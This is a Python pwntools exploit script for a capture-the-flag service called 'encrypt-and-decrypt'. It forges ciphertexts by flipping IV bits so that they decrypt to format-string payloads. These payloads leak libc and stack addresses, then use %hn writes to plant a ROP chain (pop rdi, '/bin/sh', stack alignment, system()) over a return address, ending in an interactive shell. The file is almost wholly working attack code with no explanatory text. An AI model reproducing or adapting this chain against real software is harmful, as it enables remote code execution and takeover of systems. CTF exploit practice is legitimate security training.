from pwn import *

remote_host = 'encrypt-and-decrypt.challs.csc.tf'  
remote_port = 1337 
io = remote(remote_host, remote_port)

#context.binary = './encrypt-and-decrypt'

#io = process(context.binary.path)

io.recvuntil(b"> ")

iv = 0
result = ""
def senddec(s):
    io.send(b"2\n" + s + b"\n")

def exploit(iv, exploit_str):
    delta_string = b"ABCDABCDABCDAB" +b'\0' +b'\0'
    print(f"exploit str = {exploit_str} === {len(exploit_str)}")
    xor_string = b""
    for i in range(16):
        e1 = iv[i]
        e2 = exploit_str[i]
        delta = delta_string[i]
        hexs = hex(e1^e2^delta)[2:].encode("ascii")
        if len(hexs) == 1:
            hexs = b'0' +hexs
        xor_string += hexs


    return xor_string

#
#5581B1AF3A71





def write2primEpilog(bts_short, dest_short):
    dest_short = dest_short & 0xFFFF
    s1 = b'%.'
    s2 = str(dest_short).encode("ascii")
    s3 = b'd%53$hn'
    padlen = max(0, 16 - (len(s1) + len(s2) + len(s3)))

    senddec(exploit(iv,s1 + s2 + s3 + b'-' * padlen) + result)
    io.recvuntil(b"> ")

    d1 = b'%.'
    d2 = str(bts_short).encode("ascii")
    d3 = b'd%83$hn'
    padlen = max(0, 16 - (len(d1) + len(d2) + len(d3)))
    senddec(exploit(iv, d1 + d2 + d3 + b'-' * padlen) + result)
    io.recvuntil(b"> ")


def write8prim(bts_LONGLONG, dest_short):
    b1 = bts_LONGLONG & 0xFFFF
    b2 = (bts_LONGLONG >> 16) & 0xFFFF
    b3 = (bts_LONGLONG >> 32) & 0xFFFF
    b4 = (bts_LONGLONG >> 48) & 0xFFFF
    write2primEpilog(b1, dest_short)
    write2primEpilog(b2, dest_short + 2)
    write2primEpilog(b3, dest_short + 4)
    if (b4 == 0):
        return
    write2primEpilog(b4, dest_short + 6)
# Interact with the shell

io.send(b"1\nABCDABCDABCDAB\n")
ivraw, resultraw = io.recvuntil(b"\n\n").split(b"\n")[:2]

ascii_iv = ivraw[4:].decode("ascii")
iv =  bytes.fromhex(ascii_iv)
result = resultraw[8:]

io.recvuntil(b"> ")
exploit_str = b"%49$p" + 11 * b'-'

s = exploit(iv, exploit_str) + result
senddec(s)

libc_start = int(io.recvuntil(b"\n").split(b"-")[0], 16)
libcbase = libc_start- 0x29d90

libcRDI = libcbase + 0x2a3e5


libcSYSTEM = libcbase + 0x50d70

binshString = libcbase + 0x1d8678
io.recvuntil(b"> ")


exploit_str = b"%3$p" + 12 * b"-"
s = exploit(iv, exploit_str) + result
senddec(s)
base_addr= int(io.recvuntil(b"\n").split(b"-")[0], 16)

io.recvuntil(b"> ")
#to match libc version 
print(f"libc: {libc_start:x}  base: {base_addr:x}")
retaddr = base_addr+ 0x88

#will point to libc pop RDI gadget
addr670 = retaddr + 8

#will point to binsh string which will be put in rdi
addr678 = addr670 + 8

#will point to the same ret it just ret from (stack align)
addr680 = addr678 + 8

#will point to system()
addr688 = addr680 + 8



print("ReT ADDR = ", hex(retaddr))


print("[+] RDI")
write8prim(libcRDI, retaddr)

print("[+] binsh")
write8prim(binshString, addr670)

print("[+] stack align")
write8prim(libcRDI+1, addr678)

print("[+] system()")
write8prim(libcSYSTEM, addr680)

print("Ez")

io.interactive()

